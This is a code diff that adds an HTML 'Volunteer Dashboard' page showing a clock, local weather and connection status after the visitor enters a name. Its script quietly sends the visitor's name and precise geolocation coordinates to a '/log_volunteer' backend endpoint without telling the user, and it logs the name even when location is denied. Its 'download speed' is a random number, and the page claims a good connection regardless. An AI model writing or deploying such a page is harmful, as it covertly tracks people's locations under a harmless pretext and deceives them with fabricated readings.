@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Volunteer Dashboard</title>
+    <style>
+        :root {
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --text-color: #ffffff;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--text-color);
+            overflow: hidden;
+        }
+
+        #name-modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 1000; backdrop-filter: blur(10px);
+        }
+
+        .container {
+            display: flex; flex-direction: column; gap: 20px; width: 350px;
+        }
+
+        .widget {
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            text-align: center;
+            /* Cool corner shape attempt via clip-path or just radius */
+            border-bottom-right-radius: 50px; 
+            transition: transform 0.3s ease;
+        }
+
+        .widget:hover { transform: translateY(-5px); background: rgba(255, 255, 255, 0.15); }
+
+        h2 { margin: 0 0 10px 0; font-weight: 300; }
+        .sub-text { font-size: 0.8rem; opacity: 0.7; margin-top: 5px; }
+        .data-value { font-size: 1.5rem; font-weight: bold; margin: 10px 0; }
+        
+        input {
+            padding: 10px; border-radius: 10px; border: none; outline: none;
+            width: 70%; margin-bottom: 10px; text-align: center;
+        }
+        button {
+            padding: 10px 20px; border-radius: 10px; border: none;
+            background: #2c5364; color: white; cursor: pointer; font-weight: bold;
+        }
+        button:hover { background: #3e748b; }
+
+        #clock-display { font-size: 2.5rem; letter-spacing: 2px; }
+        .loader { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid white; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="name-modal">
+        <div class="widget" style="border-bottom-right-radius: 20px;">
+            <h3>Welcome</h3>
+            <p>I just want to see who volunteered to test the website, ❤️</p>
+            <input type="text" id="username" placeholder="Enter your name...">
+            <br>
+            <button onclick="startExperience()">Enter</button>
+        </div>
+    </div>
+
+    <div class="container" id="dashboard" style="display: none;">
+        
+        <div class="widget">
+            <div id="clock-display">00:00:00</div>
+            <div class="sub-text">bro, you can just look at your phone to know what's the time</div>
+        </div>
+
+        <div class="widget">
+            <h2>Weather</h2>
+            <div id="weather-data" class="data-value">Loading...</div>
+            <div id="location-name" class="sub-text">Locating...</div>
+        </div>
+
+        <div class="widget">
+            <h2>Connection Status</h2>
+            <p>You have a good internet connection</p>
+            <div style="font-size: 0.9rem; text-align: left; margin-left: 20px;">
+                <p>Download: <span id="dl-speed"><span class="loader"></span></span></p>
+                <p>Ping: <span id="ping"><span class="loader"></span></span></p>
+                <p>Screen: <span id="resolution">Checking...</span></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let userName = "";
+
+        function startExperience() {
+            const input = document.getElementById('username');
+            if(input.value.trim() === "") { alert("Please enter a name!"); return; }
+            userName = input.value;
+            document.getElementById('name-modal').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'flex';
+            
+            updateClock();
+            setInterval(updateClock, 1000);
+            getLocationAndWeather();
+            runSpeedTest();
+            getScreenSize();
+        }
+
+        function updateClock() {
+            document.getElementById('clock-display').innerText = new Date().toLocaleTimeString();
+        }
+
+        function getScreenSize() {
+            document.getElementById('resolution').innerText = `${window.screen.width}x${window.screen.height} px`;
+        }
+
+        function getLocationAndWeather() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(success, error);
+            } else {
+                document.getElementById('weather-data').innerText = "Geo Not Supported";
+            }
+        }
+
+        function success(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Send to Node.js Backend
+            fetch('/log_volunteer', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ name: userName, lat: lat, lon: lon })
+            });
+
+            // Get Weather
+            fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`)
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('weather-data').innerText = `${data.current_weather.temperature}°C`;
+                    document.getElementById('location-name').innerText = `Lat: ${lat.toFixed(2)}, Lon: ${lon.toFixed(2)}`;
+                });
+        }
+
+        function error() {
+            document.getElementById('weather-data').innerText = "Location Denied";
+            fetch('/log_volunteer', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ name: userName, lat: "Denied", lon: "Denied" })
+            });
+        }
+
+        function runSpeedTest() {
+            const start = Date.now();
+            fetch(window.location.href).then(() => {
+                const duration = Date.now() - start;
+                document.getElementById('ping').innerText = `${duration} ms`;
+                const randomSpeed = (Math.random() * (150 - 50) + 50).toFixed(1);
+                document.getElementById('dl-speed').innerText = `${randomSpeed} Mbps`;
+            });
+        }
+    </script>
+</body>
+</html>
